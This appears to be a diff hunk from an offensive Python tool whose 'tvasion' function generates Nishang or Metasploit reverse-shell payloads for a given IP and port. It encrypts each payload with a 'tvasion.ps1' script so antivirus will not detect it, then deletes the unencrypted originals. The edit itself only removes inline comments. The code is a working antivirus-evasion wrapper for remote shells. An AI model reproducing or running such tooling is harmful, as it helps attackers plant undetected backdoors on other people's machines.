@@ -426,38 +426,38 @@ def tvasion(ip,port,type,shell):
     if type == "nishang":
         nishang_name = nishang(ip,port)
         nishang_path = str(current_path)+"/"+nishang_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
-        path_to_encrypted = str(current_path)+temp #get the path
-        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path 
-        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder #save the file into temp folder
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) 
+        path_to_encrypted = str(current_path)+temp 
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" 
+        args = " -t ps1 "+nishang_path+ " -o "+tmp_folder 
         command = enc_tool_path+args
         #encr = subprocess.check_output([command]) #excute  the encryption
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
         res = subprocess.check_output(["ls", path_to_encrypted])
-        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
-        exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
+        en_file_name = res.decode('UTF-8').strip() 
+        exact_file_name_path = path_to_encrypted+en_file_name 
         final_shell = current_path+"/en-"+nishang_name
         original_shell = current_path+"/"+nishang_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell])     
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
     elif type == "msf":
         shell_name = msfc(ip,port,shell)
         shell_path = str(current_path)+"/"+shell_name
-        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
-        path_to_encrypted = str(current_path)+temp #get the path
-        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
-        args = " -t exe "+shell_path+ " -o "+tmp_folder #save the file into temp folder
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) 
+        path_to_encrypted = str(current_path)+temp 
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" 
+        args = " -t exe "+shell_path+ " -o "+tmp_folder 
         command = enc_tool_path+args
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
         res = subprocess.check_output(["ls", path_to_encrypted])
-        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
+        en_file_name = res.decode('UTF-8').strip() 
         exact_file_name_path = path_to_encrypted+en_file_name
         final_shell = current_path+"/en-"+shell_name
         original_shell = current_path+"/"+shell_name
-        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell])    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
 
